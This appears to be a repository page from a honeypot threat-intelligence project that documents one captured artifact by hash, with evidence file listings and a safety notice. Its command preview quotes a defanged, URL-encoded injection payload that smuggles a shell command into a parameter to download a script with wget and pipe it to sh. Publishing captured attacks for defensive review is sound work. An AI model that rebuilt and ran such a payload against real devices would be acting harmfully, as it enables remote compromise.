# 87b3e6dc0282532227abe0fbce21f868ace870c08a08134e245a92d7bb05d6d3

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `87b3e6dc0282532227abe0fbce21f868ace870c08a08134e245a92d7bb05d6d3` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
ttcp_ip=-h%20%60cd%20/tmp%3Bwget%20hxxp://91[.]92[.]40[.]XXX/wget.sh%20-O-%7Csh%20-s%20lunblk%3Bbusybox%20wget%20hxxp://91[.]92.
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
